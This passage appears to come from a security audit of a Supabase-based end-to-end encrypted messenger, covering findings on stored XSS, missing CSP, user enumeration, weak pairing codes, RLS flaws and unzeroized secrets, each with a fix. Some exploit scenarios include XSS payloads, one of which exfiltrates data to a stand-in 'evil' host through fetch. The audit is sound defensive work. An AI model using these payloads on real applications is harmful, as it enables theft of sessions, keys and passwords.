**Exploit scenario.** An attacker uploads a 1-byte file named `<img src=x onerror=fetch('https://evil/?'+btoa(...))>.png`. The metadata row stores it verbatim; when the victim opens or live-receives the message the filename is written into the attachment div and the handler executes in the victim's origin → identity-key/session/password exfiltration (SM-02/SM-08).

**Remediation.** Escape `fileName` at every render site (`this._escapeHtml`) — ideally centralize all four duplicated blocks into one escaping node-builder using `textContent`. Additionally sanitize/validate `file.name` on upload in `validateFile` (strip HTML/control metacharacters, cap length).

---

#### SM-18 — Stored XSS via sender/partner email under the malicious-server threat model

- **Severity:** High
- **Category:** XSS (DOM, stored)
- **Affected:** `messaging/controllers/messengerController.js:443` (`conv.other_user_email` → `list.innerHTML` `:451`), `:1149` (`senderEmail` in `renderMessageThread`); source `database/supabaseEdgeFunctions/user-lookup.ts:182-183` (returns `data.user.email` as-is) → `databaseService.getUserEmailById` (raw) → `messagingService.js:220`; safe pattern available at `:573` (`textContent`) and `:958-959` (`_escapeHtml`)

**Description.** `other_user_email` and `senderEmail` are interpolated unescaped into `innerHTML`. They originate from the edge function / Supabase Auth and are echoed without escaping. Under the app's explicit malicious-server threat model, the server fully controls these JSON email values and can return arbitrary markup. (Under a benign server, Supabase Auth constrains email format, so this is not exploitable via an ordinary registered user's email alone — but the app itself adopts the hostile-server assumption.)

**Exploit scenario.** A malicious/compromised backend returns, for `getEmailById`, an email field containing `<img src=x onerror=...>`. The conversation list (`:451`) or message thread (`:1149`) renders it and the handler runs in the victim's origin → identity-key/session exfiltration.

**Remediation.** Escape `conv.other_user_email` and `senderEmail` everywhere they enter `innerHTML` (`this._escapeHtml`), or build nodes with `textContent` as `:573` already does for the partner name. Treat all server-returned strings as untrusted.

---

#### SM-19 — No CSP or any security headers on any page; deploy ships no header config

- **Severity:** High
- **Category:** Headers / config
- **Affected:** `messaging/views/messenger.html` and `auth/views/auth.html` `<head>` (no CSP meta); `.github/workflows/deploy.yml:45/:47` (`upload-pages-artifact` `path: '.'`); no `_headers`/`vercel.json`/`netlify.toml`; `SECURITY.md:40` acknowledges "No Content-Security-Policy is set"

**Description.** Neither HTML page sets a Content-Security-Policy and there is no server-header mechanism (GitHub Pages serves static files and cannot emit custom headers; no platform config exists). So there is no CSP, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`, `X-Content-Type-Options`, or HSTS. Combined with the confirmed unescaped `innerHTML` sinks (SM-04, SM-17, SM-18), the absence of a CSP removes the last line of defense against XSS, against rogue script origins, and against clickjacking of the recovery-key/send flows.

**Exploit scenario.** Given any XSS sink, injected inline event handlers execute freely (no `script-src`/`unsafe-inline` restriction) and exfiltrate to any domain (no `connect-src` restriction): the IndexedDB secret key, the `sessionStorage` password, and the Supabase session. Missing `frame-ancestors` allows UI-redress framing.

**Remediation.** Ship a strict CSP as a `<meta http-equiv="Content-Security-Policy">` in both HTML files, e.g. `default-src 'self'; script-src 'self' <pinned-cdn-if-not-vendored>; connect-src 'self' https://<project>.supabase.co; img-src 'self' data: blob:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`. Move inline `<script>` blocks to external files so `unsafe-inline` is unnecessary; better, vendor the CDN deps (SM-11) so `script-src` can be `'self'`. Host behind a platform (Netlify/Cloudflare) that can also send `X-Content-Type-Options`, `Referrer-Policy`, and HSTS.

---

#### SM-20 — `user-lookup` edge function: unauthenticated email↔userId enumeration (no caller authz, CORS `*`)

- **Severity:** High
- **Category:** Edge function / access control
- **Affected:** `database/supabaseEdgeFunctions/user-lookup.ts:18-79` (`serve`, no JWT/authz check), `:84-130` (`handleFindByEmail`), `:135-189` (`handleGetEmailById`), `:4-7` (CORS `*`), `:26-34` (service-role client bypasses RLS); client fallback to anon key `databaseService.js:177-220` (`_getAuthHeaders`); no `supabase/config.toml` to enforce `verify_jwt`
- **Merged from:** supply-chain (unauthenticated enumeration) + input-validation-abuse (enumeration + listUsers). The full-table-scan/cost angle is corrected below.

**Description.** The function uses the service-role key (bypasses RLS) and exposes two oracles: `findByEmail` returns a UUID for any email; `getEmailById` returns the email for any UUID. It performs **no authorization on the caller** — never reads/verifies the JWT, never checks relationship to the target. The client falls back to the public anon key when no user is signed in, and the anon key is itself a valid JWT that passes the gateway, after which the function applies zero authz. CORS is wide open (`*`). The 200(userId)-vs-404 differential is a precise account-existence oracle.

*Correction:* the original report's "lists the ENTIRE user table per lookup → DoS" claim is overstated — `admin.listUsers()` with no args defaults to page 1 / ~50 users, so per-call cost is bounded. That same default page size is, however, a real **correctness bug**: accounts beyond the first ~50 users are reported "not found" and cannot be messaged.

**Exploit scenario.** An attacker extracts the anon key from the public bundle and POSTs `{action:'findByEmail', email:'victim@example.com'}` from any origin. They confirm which emails are registered (phishing/credential-stuffing) and map UUIDs↔emails to deanonymize conversation participants of an E2EE messenger. No login required.

**Remediation.** Require and verify a real user JWT in the function: read the bearer token, call `supabaseAdmin.auth.getUser(jwt)`, reject (401) if absent/invalid or merely the anon role. Add `supabase/config.toml` with `[functions.user-lookup] verify_jwt = true`. Replace `listUsers()`+in-memory `find` with a direct indexed email lookup (fixes both enumeration surface and the truncation bug). Lock CORS to the deployed app origin. Add per-caller rate limiting keyed on `auth.uid()`, and only resolve targets the caller is permitted to (e.g. an existing contact).

---

#### SM-21 — `device_keys` protects the identity secret with only a 6-digit code; no server rate limit, expiry unenforced in RLS

- **Severity:** High
- **Category:** Broken access control / weak secret protection
- **Affected:** `database/setup/messaging-schema.sql:276-314` (`encrypted_secret_key`/`encryption_nonce`/`pairing_code`; `device_keys_select_own` `:301`; index on `pairing_code` `:297`; `expires_at` not enforced in RLS)
- **Relationship:** This is the schema/RLS-layer view of the same artifact as SM-06 (brute-force) and SM-16 (off-device export). Tracked here for the RLS/expiry-enforcement remediation specifically.

**Description.** `device_keys` stores the identity secret key encrypted with a key derived from a 6-digit code. RLS is correctly owner-scoped, but the secret reduces to brute-forcing 10⁶ candidates with no server-side rate limiting/attempt counter, and the `pairing_code` index is built for lookup. The 5-minute expiry is a column only — RLS does not reject expired rows and nothing deletes them, so a stale row holding the encrypted secret can linger.

**Exploit scenario.** Any path yielding one `device_keys` row (service-role/edge bug, DB backup, RLS-loosening, or the server itself) enables an offline loop over all 10⁶ codes against `encrypted_secret_key`+`encryption_nonce`, recovering the identity secret.

**Remediation.** As SM-06: high-entropy pairing secret, slow KDF, attempt cap. Additionally enforce expiry server-side — add `expires_at > now()` to the SELECT policy and a scheduled `DELETE FROM device_keys WHERE expires_at < now()`.

---

#### SM-22 — No message size limit (storage/bandwidth + render-freeze griefing)

- **Severity:** High *(one source rated medium; retained as high per the original finding's severity — see note)*
- **Category:** Resource exhaustion / missing input limit
- **Affected:** `messaging/services/messagingService.js:99-122` (`sendMessage`, only `!content?.trim()`); `messengerController.js:1281` (`handleSendMessage`), `:1579` (`handleSendNewMessage`), only `.trim()`; `messenger.html:59, :89` (textareas, no `maxlength`); `messages.encrypted_content TEXT` with no length cap (`messaging-schema.sql:451`)

> **Severity note.** The verdict for the messagingService instance adjusted this to **medium** (bounded to shared conversations, capped by PostgREST request limits, no amplification). It is presented here at **high** to match the original input-validation finding's classification; reviewers prioritizing exploit reach should treat it as **medium**. Either way the fix is the same.

**Description.** `sendMessage` validates only non-emptiness. There is no max-length check in the service, controller, validators, HTML inputs, or schema. A caller can submit a multi-megabyte message; it is encrypted and inserted with no size guard, bloating Postgres and freezing the recipient's tab when `renderMessageThread` injects the giant string into `innerHTML`.

**Exploit scenario.** An attacker (any participant) calls `window.MessagingService.sendMessage(convId, me, victim, 'A'.repeat(20_000_000))` or pastes a huge blob. Each call writes tens of MB; the victim downloads, decrypts, and renders it, freezing/crashing their tab.

**Remediation.** Enforce a max plaintext length (e.g. 4–16 KB) in `sendMessage` **before** encryption, return a clear error if exceeded, add `maxlength` on `#message-input`/`#new-message-content`, and add `CHECK(length(encrypted_content) < N)` (or a trigger) as defense-in-depth against direct PostgREST calls.

---

### MEDIUM

---

#### SM-23 — No rate limiting on message send / conversation creation (message-bomb, row-flood)

- **Severity:** Medium *(adjusted from high — bounded to existing/openable conversations with a known peer)*
- **Category:** Missing rate limiting / abuse
- **Affected:** `messaging/services/messagingService.js:86-169` (`sendMessage`), `:39-84` (`getOrCreateConversation`); controllers `messengerController.js:1273`/`:1569`; no throttle/cooldown anywhere in `messaging/`

**Description.** No client- or server-side throttling on `sendMessage` or `getOrCreateConversation`. RLS permits any participant to INSERT unlimited rows. The only abuse control is the client-side, bypassable, and direction-inverted block check (SM-15).

**Exploit scenario.** An attacker scripts a tight send loop to flood a shared conversation; each message fires the victim's realtime callback (decrypt + `getUserEmailById` edge call + `innerHTML` append + mark-read), melting the tab. `getOrCreateConversation` can be looped to flood the `conversations` table.

**Remediation.** Move send/conversation-create behind an RPC or edge function enforcing per-user/per-recipient quotas, or use a Postgres trigger counting recent inserts per sender. Enforce blocking in RLS (SM-15). Client-side debounce is UX only.

---

#### SM-24 — Decryption silently re-derives a fresh session on auth failure, masking tampering/MITM

- **Severity:** Medium
- **Category:** AEAD failure handling
- **Affected:** `encryption/services/keyManagementService.js:907-924` (catch deletes cached session, re-derives via `_deriveSessionFromHistory` `:917`, retries); `_deriveSessionFromHistory:1180-1204` re-fetches the live (untrusted) server key via `getCurrentKey`

**Description.** When `secretbox.open` fails the Poly1305 check, the code assumes the cached session is "stale," deletes it, re-derives from the **current server public key**, and retries — conflating a benign stale cache with a genuine authentication/tamper failure. Because re-derivation pulls the peer key fresh from the untrusted server, a server that has swapped the peer's key causes the client to silently rebuild a session against the attacker key on the first failed message, removing the one observable MITM signal. (For pure tampering with an unchanged key the retry fails again and the error is ultimately re-thrown — delayed, after a needless rebuild.)

**Exploit scenario.** The server swaps Bob's `public_key`. Alice's cached-session decrypt fails; the catch path re-derives ECDH against the attacker key and retries, normalizing the silent key change and smoothing a MITM transition (compounds SM-01).

**Remediation.** Treat `secretbox.open` failure as a hard integrity error by default. Only re-derive on an explicit, authenticated reason; when the peer key actually changes, require user re-verification of the safety number before establishing the new session. Distinguish "stale cache" from "authentication failed."

---

#### SM-25 — Conversations creatable by any user pairing themselves with an arbitrary victim (unsolicited E2EE spam)

- **Severity:** Medium
- **Category:** Authorization logic
- **Affected:** `database/setup/messaging-schema.sql:428-431` (`conversations_insert_participant WITH CHECK auth.uid()=user1_id OR auth.uid()=user2_id`); `friends`/`blocked_users` tables never referenced by conversation/message RLS; `messages_insert_participant:488-496`

**Description.** The conversations INSERT policy requires only that the creator is one participant; it never requires the other to have accepted a friend request or to not have blocked the creator. Any user can create a conversation with any victim UUID (enumerable via SM-14 or the edge function SM-20) and then insert messages. This is the substrate for the block-bypass (SM-15) and unsolicited spam from strangers, delivered in real time (tables are in the `supabase_realtime` publication).

**Exploit scenario.** Attacker harvests a victim UUID, inserts an ordered `conversations` row (attacker is one side), then inserts messages. The victim receives real-time messages from a stranger with no server consent gate.

**Remediation.** Gate conversation creation (and/or message insert) on an accepted friendship and a not-blocked relationship via a `SECURITY DEFINER` helper keyed on the `user1_id`/`user2_id` pair. If open messaging is intended, add a message-request quarantine + per-sender rate limiting.

---

#### SM-26 — Password reset re-encrypts as password-only and discards the recovery key (recovery escrow silently dropped)

- **Severity:** Medium
- **Category:** Recovery orphaning on password reset
- **Affected:** `auth/views/auth.html:997-1003` (recovery restore handler calls `createPasswordOnlyBackup(newPassword)`); `keyBackupService.js:196-232` (NULLs `recovery_encrypted_data`/`recovery_salt`/`recovery_iv` at `:214-216`, returns no new recovery key); regen fallback `keyManagementService.js:624-628`

**Description.** After a user recovers post-reset, the app re-encrypts via `createPasswordOnlyBackup`, which explicitly NULLs the recovery columns and generates a brand-new session backup key, **without** issuing a new recovery key. The account is left with a password-only backup and no recovery escrow; the previously saved recovery key now decrypts nothing, and a future password reset has no recovery path — a silent downgrade.

**Exploit scenario.** A user recovers once (recovery columns wiped), later forgets the new password, resets again, is offered recovery-key restore, but `recovery_encrypted_data` is NULL so restore throws "Invalid recovery key" — identity key permanently lost.

**Remediation.** On any backup re-encryption after recovery/reset, generate and surface a **new** recovery key (use `createIdentityBackup`, which populates recovery material, instead of `createPasswordOnlyBackup`) and prompt the user to save it. Never silently drop recovery escrow; warn explicitly if it is being removed.

---

#### SM-27 — Unescaped exception messages rendered into `innerHTML` on load/open error paths

- **Severity:** Medium *(adjusted up from low — source is the server-controlled HTTP error body under the untrusted-server model)*
- **Category:** XSS (DOM)
- **Affected:** `messaging/controllers/messengerController.js:398` (`error.message` in `list.innerHTML`), `:686` (`error.message` in `messageThread.innerHTML`); source `databaseService.js:962` (`_handleResponse` returns the raw server error body verbatim)

**Description.** On failure, `error.message` is interpolated directly into `innerHTML`. On a non-OK HTTP response `_handleResponse` returns the server's response-body message verbatim, which flows through `messagingService`/`databaseService` to these sinks. Under the app's untrusted-server threat model the server can return `{"message":"<img src=x onerror=...>"}` with a 4xx/5xx status to trigger an error path; `<img onerror>` executes via `innerHTML`. JS execution here reads the unencrypted IndexedDB key and `sessionStorage` password.

**Exploit scenario.** A malicious server returns a crafted error body for a `getConversations`/`getMessages` call; the catch path writes it into `innerHTML` and the handler fires in the victim's origin.

**Remediation.** Use `textContent` for error display, or escape `error.message` via `this._escapeHtml` (already defined at `:1028`) before interpolation. Never interpolate exception messages into `innerHTML`.

---

#### SM-28 — No MIME/type/extension validation on upload; download Blob re-typed with attacker-controlled `mime_type`

- **Severity:** Medium *(verdict adjusted to low — no inline-render path exists today; retained at medium per the original attachments finding, see note)*
- **Category:** Unrestricted file upload / content handling
- **Affected:** `messaging/services/attachmentService.js:108-122` (`validateFile`, size-only; comment `:114` "any file type is allowed"), `:311` (`mime_type` stored raw), `:407` (download Blob typed with `attachment.mime_type`); `getFileIcon` `:510-518`

> **Severity note.** The only blob consumer today forces a save via `a.download` (`messengerController.js:1406-1413`), with no `window.open`/iframe/`target=_blank` anywhere — so there is no present inline-execution path and the verdict adjusted this to **low** (type/icon spoofing + missing allow-list). It is listed at **medium** because any future preview feature flips it to XSS; treat as **low** if you only score the shipped code.

**Description.** `validateFile` checks size only; raw client-supplied `file.type` is stored as `mime_type` with no allow-list or magic-byte check, and on download the decrypted bytes are wrapped in a Blob using that attacker-controlled type. Today the forced-download path mitigates inline execution, but the type confusion misleads recipients (e.g. an HTML/SVG payload shown with an image icon), and any future inline-open feature would serve attacker HTML/SVG under the app origin.

**Remediation.** Validate type against an allow-list at upload (reject `text/html`, `image/svg+xml`, `application/xhtml+xml`, and extension/declared/magic-byte mismatches). On download never trust the stored `mime_type` for inline rendering — use `application/octet-stream` for any preview, keep forcing `a.download`, and never `window.open()` the blob URL.

---

#### SM-29 — Attachment expiry not enforced server-side; expired/orphaned files never deleted from Storage

- **Severity:** Medium
- **Category:** Data retention / insufficient enforcement
- **Affected:** `messaging/services/attachmentService.js:371` (client-side-only expiry check); `cleanup_expired_attachments` `database/setup/messaging-schema.sql:641-659` (`DELETE FROM message_attachments` only; comment `:651` "file deletion must be handled separately"); function is **never scheduled** (no `pg_cron`/RPC/edge invocation)

**Description.** The "24-hour auto-expire" guarantee is enforced only client-side (`downloadAttachment` compares `expires_at` and refuses) — trivially bypassed by calling Storage download directly (SM-05 allows it regardless of expiry). The DB cleanup function deletes only metadata rows and is not even wired to run; the encrypted bytes persist in Storage indefinitely, and the row deletion removes the only record of `storage_path`, orphaning the file forever. (`supabase-storage-setup.md:38` promises auto-delete the code does not deliver.)

**Exploit scenario.** A user sends a sensitive file believing it self-destructs in 24h. After expiry the DB row is purged but the encrypted object remains; any authenticated user (SM-05) can still download those "expired" bytes long after, and storage grows unbounded.

**Remediation.** Enforce expiry where the data lives: set a Storage lifecycle/TTL rule, or have a trusted edge function collect `storage_path` and delete the storage objects **before** deleting metadata, on a real schedule (`pg_cron`). Add an `expires_at` check to the storage RLS, or move downloads behind a signed-URL edge function that re-checks expiry server-side.

---

#### SM-30 — `message_attachments` UPDATE allowed by any participant (cross-user metadata tamper + XSS amplification + expiry bypass)

- **Severity:** Medium *(one source rated low; the stored-XSS amplification + expiry-bypass justify medium)*
- **Category:** Authorization logic / data integrity
- **Affected:** `database/setup/messaging-schema.sql:595-602` (`attachments_update_participant` USING conversation membership, no `WITH CHECK`, no column scope; comment `:594` "Only uploader can update"); table-wide grant `:608`; client `attachmentService.js:398-401` (download-count bump)

**Description.** The UPDATE policy permits **any** conversation participant to update **any** column (no `WITH CHECK`, no column restriction), contradicting the "only uploader" comment. A participant can rewrite `file_name` (planting an XSS payload on the counterparty's row — SM-17), `storage_path`/`encrypted_file_key` (tamper/object substitution), or `expires_at` far into the future (defeating cleanup — SM-29).

**Exploit scenario.** A recipient issues `update({expires_at:'2099-01-01', file_name:'<img src=x onerror=...>'}).eq('id', victimAttachmentId)` — passes RLS as a participant, injects stored XSS into someone else's row and extends retention indefinitely.

**Remediation.** Tighten to `USING (auth.uid() = uploader_id) WITH CHECK (auth.uid() = uploader_id)` and restrict updatable columns: `REVOKE UPDATE` on the table, then `GRANT UPDATE(downloaded_count)`, ideally moving the increment into a `SECURITY DEFINER` function so all other columns are immutable after insert.

---

#### SM-31 — `registerDevice` calls non-existent crypto APIs → device registration always fails silently

- **Severity:** Medium *(adjusted from high — broken feature, not an exploitable bypass of an existing protection)*
- **Category:** Correctness / broken crypto flow
- **Affected:** `messaging/services/devicePairingService.js:183` (`window.KeyStorageService.getPublicKey` — no such method; actual is `getIdentityKeys`), `:188` (`window.CryptoService.serializePublicKey` — `window.CryptoService` is never defined; actual is `window.CryptoPrimitivesService.serializeKey`); error swallowed `:212-218`; caller `auth/views/auth.html:692` ignores the `{success:false}` result

**Description.** `registerDevice()` references two non-existent APIs and throws on the first (`getPublicKey` at `:183`) before reaching the second (`serializePublicKey` at `:188`). The TypeError is caught and returned as `{success:false}`, and the caller ignores it, so the device-registration row is never written. Any device-inventory-dependent capability (revoke device, list trusted devices, alert on new device) cannot exist. *Severity adjusted down* because these features are not implemented — the bug prevents them from ever coming into existence rather than bypassing a live control.

**Remediation.** Fix **both** calls: `:183` → `(await window.KeyStorageService.getIdentityKeys(userId)).publicKey`; `:188` → `window.CryptoPrimitivesService.serializeKey(...)` with an availability/initialization guard as `_encryptKeys` does. Surface the `{success:false}` result at `auth.html:692` instead of swallowing it. Add a test that `registerDevice` writes a row.

---

#### SM-32 — supabase-js loaded from CDN with no Subresource Integrity (three pages, unpinned `@2`)

- **Severity:** Medium
- **Category:** Supply chain
- **Affected:** `auth/views/auth.html:9`, `messaging/views/messenger.html:9`, `payments/views/subscription.html:9, :83` — `<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js">`, no `integrity`/`crossorigin`, open `@2` range

**Description.** Three HTML entry points pull the Supabase client (which owns the auth session, the access token, and every encrypted-payload upload/download) from jsdelivr with no SRI. The open `@2` range means the byte content can change at any time, making SRI impossible without pinning first.

**Exploit scenario.** A CDN compromise or malicious `@2` publish injects code that reads the JWT/session, reads decrypted text after the app decrypts it, swaps recipient public keys (MITM), or exfiltrates the `sessionStorage` password.

**Remediation.** Pin a concrete version (`@supabase/supabase-js@2.x.y`) and add `integrity="sha384-..." crossorigin="anonymous"`, or vendor locally under `shared/vendor/`. (TweetNaCl — SM-11 — is the higher-priority SRI target.)

---

#### SM-33 — Unrestricted upload to attachments bucket (storage flooding + path poisoning)

- **Severity:** Medium *(one source rated high; per-file size is capped server-side by the bucket setting, so the unmitigated vectors are count/path, not oversize)*
- **Category:** Broken access control / resource abuse
- **Affected:** `database/setup/messaging-schema.sql:621-624` (INSERT policy `bucket_id`-only); `attachmentService.js:285-287` (client-chosen `${conversationId}/...` path); client-only size cap `:108-122`

**Description.** The storage INSERT policy checks only the bucket id. A user can upload objects to any path (any `conversationId` prefix) with no per-user quota, and nothing ties the path to `auth.uid()` or to a conversation the uploader participates in. File **count** is unbounded (per-file size is enforced by the bucket's 1 MB setting). Combined with SM-29, orphan files (uploaded without a matching DB row) are never reaped.

**Exploit scenario.** An attacker scripts repeated uploads into other users' conversation prefixes (path poisoning) and floods storage with unbounded objects.

**Remediation.** Restrict the INSERT policy to conversations the uploader belongs to and bind the path to `auth.uid()` (e.g. require `<conversation_id>/<auth.uid()>/...`). Enforce a per-user object-count/rate limit server-side (edge function or DB trigger), not just client-side `validateFile`.

---

### LOW

---

#### SM-34 — HKDF extract salt is a deterministic SHA-256 of the (public) info string

- **Severity:** Low *(adjusted from medium — RFC 5869 permits a constant/empty salt; no standalone exploit)*
- **Category:** KDF misuse
- **Affected:** `encryption/services/keyDerivationService.js:99-135` (`_hkdf`; synthetic salt at `:119`), `:144-149` (`_deriveContextSalt = SHA-256('MoneyTracker:ContextSalt:'+info)`); session/message callers pass no salt (`:53`, `:65`)

**Description.** When no salt is supplied (session and message keys), HKDF uses a salt computed as SHA-256 of the deterministic info string — effectively a fixed public constant per context across all users. This contributes no extraction-step randomization and no cross-user domain separation. Per RFC 5869 a constant/empty salt is permitted, so this does not by itself break confidentiality — but it removes a defense-in-depth layer and reinforces the deterministic-derivation concerns in SM-09/SM-10.

**Remediation.** For session-key extraction use a real random salt negotiated/stored per session (or the peers' public keys plus a fresh random nonce). For message keys, drive a symmetric ratchet so each key depends on a ratcheted value rather than a constant salt + linear counter. Do not synthesize a salt from the public info string.

---

#### SM-35 — Secrets never zeroized — passwords, identity/shared/session/message keys linger in memory

- **Severity:** Low *(adjusted from medium — defense-in-depth; requires pre-existing local memory access)*
- **Category:** Missing key/secret zeroization
- **Affected:** No `.fill(0)`/wipe anywhere in `encryption/`, `shared/`, `messaging/`; e.g. `keyManagementService.js:760` (shared secret), `:767` (session key), `:834` (message key), `:427-441` (decrypted secretKey in `restoreFromPassword`); `passwordManager.clear():94-100` only removes the `sessionStorage` entry

**Description.** No path overwrites secret buffers after use. Secret-key `Uint8Array`s, shared secrets, derived session/message keys, and the plaintext password linger in the JS heap until GC. `PasswordManager.clear()` only calls `removeItem`; the parsed/original password strings are not cleared.

**Remediation.** Overwrite secret `Uint8Array`s with `key.fill(0)` at the end of each operation; prefer non-extractable WebCrypto `CryptoKey`s so raw bytes never enter the heap. JS strings are immutable and cannot be zeroized, so derive key material immediately and discard the string (best-effort in a browser).

---

#### SM-36 — Safety number truncates SHA-512 to 30 decimal digits (~100 bits) and is never displayed

- **Severity:** Low
- **Category:** Safety-number correctness
- **Affected:** `encryption/services/cryptoPrimitivesService.js:232-266` (`generateSafetyNumber`; `hash.slice(0,30).map(b => b%10)` `:254-257`); default 6×5 = 30 digits (`encryptionConfigBase.js:130-131`); never invoked from any UI

**Description.** `generateSafetyNumber` hashes the sorted concatenation of both public keys with SHA-512, keeps only 30 of 64 bytes, and maps each to `b%10` (≈100 bits). The `b%10` bias is negligible (~0.008 bits total); the dominant loss is using only 30 bytes/one digit per byte. ~100 bits is still cryptographically ample. The material problem is that it is **never surfaced in any UI** — the entire MITM-verification defense is absent (ties to SM-01).

**Remediation.** Render the full hash as more digits using an unbiased big-integer-to-decimal conversion (Signal-style, ~60 digits), include both identity keys + a stable per-user identifier, and — most importantly — actually display and require safety-number verification in the conversation UI.

---

#### SM-37 — Latent plaintext-downgrade: `NullEncryptionFacade` exists and realtime path trusts mutable `is_encrypted`

- **Severity:** Low
- **Category:** Downgrade / plaintext path
- **Affected:** `encryption/facade/nullEncryptionFacade.js:62-67`/`:76-79` (plaintext facade); `encryptionModule.js:87` (`_facade` hardcoded to `EncryptionFacade`); `messengerController.js:754-755` (realtime path gates decryption on `is_encrypted` + falls back to `newMessage.content`); `is_encrypted` column `messaging-schema.sql:455`

**Description.** A fully wired plaintext facade exists with the real one's interface but is dormant (`_facade` hardcoded; `sendMessage` fails closed). Separately, the realtime receive path gates decryption on the mutable server boolean `is_encrypted` and falls back to a server-provided `content`, so a malicious server can render server-authored text in a row without decryption (escaped, so no XSS — impact is server-side message spoofing, a subset of the known untrusted-server threat). *Correction:* the initial-load `getMessages` path does **not** trust `is_encrypted` — it branches solely on ciphertext/nonce presence and always attempts decryption (and there is no plaintext `content` column).

**Remediation.** Fence off `NullEncryptionFacade` so it cannot be selected. Make the realtime path require + verify ciphertext+nonce and fail closed, rather than reading `is_encrypted`/`newMessage.content`.

---

#### SM-38 — Recovery-key parser does not validate decoded length (truncated key → generic error)

- **Severity:** Low
- **Category:** Recovery-key robustness
- **Affected:** `encryption/services/passwordCryptoService.js:194-222` (`formatRecoveryKey`), `:231-260` (`parseRecoveryKey` — returns whatever was decoded, no 32-byte check)

**Description.** *Corrected framing:* no entropy is lost in the Base32 round-trip (the accumulator stays well under 32 bits; round-trip is exact). The real defect is that `parseRecoveryKey` never validates the decoded array is exactly 32 bytes, so a truncated/mistyped key silently decodes short, feeds a wrong-length value into PBKDF2, and fails with a generic "Invalid recovery key," masking the input error and contributing to recovery confusion (compounds SM-13).

**Remediation.** After `parseRecoveryKey`, assert the decoded array is exactly 32 bytes and throw a precise length/format error. Add round-trip tests for full 32-byte keys including the final-bits padding boundary.

---

#### SM-39 — `friends` UPDATE policy lacks `WITH CHECK`; `status='blocked'` is unenforced

- **Severity:** Low
- **Category:** Authorization logic
- **Affected:** `database/setup/messaging-schema.sql:106-107` (`friends_update_as_friend USING auth.uid()=friend_user_id AND status='pending'`, no `WITH CHECK`)

**Description.** Without `WITH CHECK`, the recipient of a pending request can set `status` to any CHECK-allowed value (self-accept, or `blocked`). No server policy consults `friends.status`, so a friends-level `blocked` is cosmetic. Latent today (no live trust decision depends on it), but a hazard if a future feature trusts `friends.status`.

**Remediation.** Add `WITH CHECK (auth.uid()=friend_user_id AND status IN ('accepted','blocked'))`. Consolidate blocking into one mechanism (`blocked_users`) and have server policies actually consult it.

---

#### SM-40 — `conversation_participants` table + RLS are dead and ineffective (self-only SELECT)

- **Severity:** Low
- **Category:** Dead authorization surface
- **Affected:** `database/setup/messaging-schema.sql:396-420` (`conversation_participants`; `_select_involved USING auth.uid()=user_id`, `_insert_new_conversation WITH CHECK auth.uid()=user_id`); never referenced in any `.js`/`.html`

**Description.** The table is never inserted/selected/referenced; its SELECT policy is self-only (can never reflect the peer), so even if wired up it could not answer "who else is in this conversation." The live model uses `conversations.user1_id`/`user2_id`. A future developer might "wire it up" and rely on its broken scope (it would fail closed, not open).

**Remediation.** Remove the table (the 1:1 model is sufficient), or — if group chat is planned — populate it via a server-side trigger on conversation creation and change the SELECT policy to "visible to all participants" via a `SECURITY DEFINER` membership helper to avoid recursive-RLS issues.

---

#### SM-41 — Self-messaging not guarded in the app layer (unhandled DB CHECK error leaks constraint name)

- **Severity:** Low
- **Category:** Missing recipient validation
- **Affected:** `messaging/services/messagingService.js:39-84` (`getOrCreateConversation`, no `user1Id !== user2Id` check); only protection is CHECK `conversations_users_different`/`conversations_users_ordered` (`messaging-schema.sql:357-358`); error surfaced via `alert()` at `messengerController.js:1620`

**Description.** Neither `getOrCreateConversation` nor the email send path verifies that the recipient differs from the sender. A user entering their own email resolves their own id, the CHECK violation surfaces as a raw PostgREST error echoed into an `alert()`, leaking internal constraint names. Self-inflicted, not a cross-user exploit.

**Remediation.** Reject self-messaging early in `getOrCreateConversation` (`user1Id === user2Id`) and in `handleSendNewMessage` (compare resolved recipient against current user). Map DB errors to generic user-facing text instead of echoing constraint messages.

---

#### SM-42 — Recipient validation minimal; email format never validated before the edge call

- **Severity:** Low *(the block-bypass leg duplicates SM-15; this finding tracks the missing email-format validation)*
- **Category:** Recipient validation
- **Affected:** `messaging/services/messagingService.js:92-97` (client-only block check — see SM-15); `messengerController.js:1578-1591` (`handleSendNewMessage` checks non-empty only; `Validators.email` at `validators.js:13-17` is **never called** anywhere)

**Description.** `handleSendNewMessage` does not validate recipient email format (no `Validators.email` call), so malformed input is sent straight to the `user-lookup` edge function, adding load. (The client-side, bypassable, direction-inverted block check is the core SM-15 issue.)

**Remediation.** Call `Validators.email` in `handleSendNewMessage` and reject malformed recipients before any network call. Enforce blocking in RLS per SM-15.

---

#### SM-43 — `conversationId`/`messageId` accepted unvalidated at the service boundary

- **Severity:** Low
- **Category:** Input validation
- **Affected:** `messaging/controllers/messengerController.js:133` (URL `parseInt`, guarded by `this.conversations` at `:134`); `messagingService.getMessages/markConversationAsRead/subscribeToConversation/getOrCreateConversation` accept raw ids into filter construction; error rendered into `innerHTML` at `:686` (see SM-27)

**Description.** Ids flow from the URL, DOM dataset, and realtime payloads into the service layer with no type/positive-integer validation; the code relies on RLS for ownership (which holds, so no confidentiality break). Malformed/out-of-range ids produce raw PostgREST error strings. Through the real UI a bogus id is gated before reaching the service; the realistic way to hit `:686` with a raw DB error is a direct self-session console call.

**Remediation.** Validate ids are positive integers at the `MessagingService` boundary and return a generic error for malformed input. Never render raw `error.message` into `innerHTML` (SM-27).

---

#### SM-44 — `validateSession()` ignores its `bypassCache` argument — periodic validation cannot force a server re-check

- **Severity:** Low
- **Category:** Session validation robustness
- **Affected:** `shared/services/authService.js:871` (`async validateSession(autoRedirect = false)` — one param); callers pass two: `:501` (`validateSession(true, true)`) and `shared/utils/offlineHandler.js:199`; relies solely on `getSession()` (`:887`); `getUser()` is never called anywhere

**Description.** The periodic interval and the back-online revalidation both call `validateSession(true, true)` intending `bypassCache=true`, but the function declares one parameter and has no bypass logic. It relies on `getSession()` (cached unless the access token is expired), so revocation detection is not accelerated — it is bounded by access-token TTL (the function does hit the server on the refresh path when the token is expired, so revocation is eventually caught, just not proactively). The doc-comment "No caching - always checks server" is inaccurate.

**Remediation.** Add the second parameter and, when `bypassCache` is true, call `this.client.auth.getUser()` (server round-trip, fails on a revoked session) instead of relying solely on `getSession()`. Fix both call sites and the doc-comment.

---

#### SM-45 — `messenger.html` never invokes `AuthGuard`; only gate is an in-memory check

- **Severity:** Low
- **Category:** Route protection / defense-in-depth
